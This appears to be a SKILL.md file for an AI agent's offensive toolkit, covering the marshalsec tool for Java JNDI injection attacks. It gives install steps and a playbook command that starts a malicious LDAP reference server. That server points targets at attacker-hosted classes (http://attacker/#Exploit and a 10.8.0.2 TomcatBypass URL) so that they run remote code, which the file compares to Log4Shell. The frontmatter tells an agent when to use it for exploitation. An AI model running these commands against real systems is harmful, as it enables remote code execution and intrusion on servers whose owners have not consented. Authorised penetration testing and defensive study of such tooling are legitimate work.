---
name: marshalsec-deser
description: "marshalsec: JNDI injection exploitation infrastructure. Signals: pwn, binary exploitation, malicious LDAP, RMI service, codebase URL."
zh-signals: "marshalsec: JNDI 注入利用基础设施。信号:pwn,二进制利用,恶意 LDAP,RMI 服务,codebase URL。"
when-to-use: >-
  Use when exploiting a JNDI lookup or Java deserialization sink; start a malicious LDAP or RMI
  reference server that serves the remote class payload to the target.
---

# marshalsec

- Attack Category: C46 Binary Exploitation and Pwn
- Upstream Repository: https://github.com/mbechler/marshalsec
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/mbechler/marshalsec && mvn clean package -DskipTests
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker/#Exploit 1389` | Malicious LDAP |
| `marshalsec.jndi.RMIRefServer` | RMI service |
| `--codebase` | codebase URL |

## Attack Scenario Playbook

### JNDI Injection Exploitation Infrastructure

```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://10.8.0.2:8080/#TomcatBypass 1389
# Target JNDI lookup points to our host → loads the remote malicious class → RCE (same as Log4Shell)
```

## Notes

A Swiss Army knife for Java deserialization/JNDI attacks; a standard piece of infrastructure since Log4Shell.
